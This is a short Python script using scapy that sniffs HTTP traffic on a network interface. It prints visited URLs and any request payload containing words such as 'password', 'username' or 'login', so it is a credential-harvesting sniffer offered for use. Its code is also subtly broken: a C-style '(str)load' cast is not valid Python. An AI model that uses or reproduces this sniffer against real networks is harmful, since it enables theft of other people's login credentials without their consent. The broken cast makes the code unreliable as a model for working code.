'''
Created on 23 Aug 2021

@author: adam
'''
#!/usr/bin/python3

#pip install scapy and scapy_http befor running this script if note aready installed

import scapy.all as scapy
from scapy_http import http

def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_packets)
    
def process_packets(packet):
    if packet.haslayer(http.HTTPRequest):
        url = packet[http.HTTPRequest].HOST + packet[http.HTTPRequest].Path
        print(url)
        if packet.haslayer(scapy.Raw):
            load = packet[scapy.Raw].load
            for i in words:
                if i in (str)load:
                    print(load)
                    break
            
        

words = ["Password","password", "User", "user", "Username", "username", "login", "pass"]

sniff("eth0")